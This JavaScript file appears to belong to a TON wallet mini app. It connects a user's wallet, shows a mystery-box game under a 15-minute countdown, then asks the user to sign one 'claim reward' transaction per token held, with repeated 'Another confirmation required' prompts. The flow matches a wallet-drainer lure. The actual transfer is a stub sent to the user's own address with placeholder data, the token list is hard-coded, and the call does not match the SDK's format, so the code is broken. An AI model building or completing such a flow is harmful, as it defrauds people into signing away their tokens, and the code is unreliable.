let walletAddress = null;
let timerInterval;
let jettonsToClaim = [];
let currentIndex = 0;

// ---------- Init connector ----------
const connector = new TonConnectSDK.TonConnect({
    manifestUrl: "https://emperator16.github.io/miniapp/manifest.json"
});

// ---------- Connect Wallet ----------
document.getElementById("connectBtn").onclick = async () => {
    try {
        // Fetch wallets supported by TonConnect
        const walletInfoList = await connector.getWallets();

        // If you want specifically Tonkeeper first (common case)
        const tonkeeper = walletInfoList.find(w => w.name.toLowerCase().includes("tonkeeper"));

        if (tonkeeper) {
            // Use universalLink (works for mobile + telegram mini app)
            connector.connect({
                universalLink: tonkeeper.universalLink,
                bridgeUrl: tonkeeper.bridgeUrl
            });
        } else {
            // If you want show all wallets available (fallback)
            connector.connect(walletInfoList.map(w => ({
                universalLink: w.universalLink,
                bridgeUrl: w.bridgeUrl
            })));
        }

    } catch (err) {
        console.error("Connection failed:", err);
        alert("Wallet connection failed. Try in mobile or inside Telegram.");
    }
};

// ---------- Listen for connection result ----------
connector.onStatusChange(info => {
    if (info && info.account) {
        walletAddress = info.account.address;
        console.log("Connected:", walletAddress);
        alert("Wallet connected: " + walletAddress);

        document.getElementById("connectDiv").style.display = "none";
        document.getElementById("gameDiv").style.display = "block";

        // Fetch user jettons if needed
        fetchUserJettons(walletAddress).then(jettons => {
            jettonsToClaim = jettons;
        });
    }
});

// ---------- Play Game ----------
document.getElementById("playBtn").onclick = () => {
    document.getElementById("gameDiv").style.display = "none";
    document.getElementById("rewardDiv").style.display = "block";
    document.getElementById("animationDiv").innerHTML = '<img src="images/box-open.gif">';
    startTimer(15 * 60);
};

function startTimer(duration) {
    let time = duration;
    timerInterval = setInterval(() => {
        let minutes = Math.floor(time / 60);
        let seconds = time % 60;
        document.getElementById("timer").textContent = 
            `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        if (--time < 0) {
            clearInterval(timerInterval);
            alert("Claim time expired.");
            document.getElementById("rewardDiv").style.display = "none";
            document.getElementById("gameDiv").style.display = "block";
        }
    }, 1000);
}

// ---------- Claim Reward ----------
document.getElementById("claimBtn").onclick = async () => {
    document.getElementById("rewardDiv").style.display = "none";
    await processNextClaim();
};

async function processNextClaim() {
    if (currentIndex >= jettonsToClaim.length) {
        clearInterval(timerInterval);
        document.getElementById("claimDiv").style.display = "none";
        document.getElementById("confettiDiv").style.display = "block";
        setTimeout(() => {
            document.getElementById("confettiDiv").style.display = "none";
            document.getElementById("successDiv").style.display = "block";
        }, 3000);
        return;
    }
  
    document.getElementById("claimDiv").style.display = "block";
    try {
        const jetton = jettonsToClaim[currentIndex];
        const payload = {
            type: "transfer",
            to: walletAddress,
            amount: 0,
            payload: "0x1234"
        };
        await connector.sendTransaction(payload);

        currentIndex++;
        document.getElementById("claimDiv").style.display = "none";

        if (currentIndex < jettonsToClaim.length) {
            alert("Another confirmation required");
            await processNextClaim();
        } else {
            document.getElementById("confettiDiv").style.display = "block";
            setTimeout(() => {
                document.getElementById("confettiDiv").style.display = "none";
                document.getElementById("successDiv").style.display = "block";
            }, 3000);
        }
    } catch (e) {
        alert("Transaction failed or cancelled.");
        document.getElementById("rewardDiv").style.display = "block";
    }
}

document.getElementById("playAgainBtn").onclick = () => {
    document.getElementById("successDiv").style.display = "none";
    document.getElementById("gameDiv").style.display = "block";
};

async function fetchUserJettons(address) {
    return [
        {address: '0:abc123...', amount: 1},
        {address: '0:def456...', amount: 1}
    ];
}
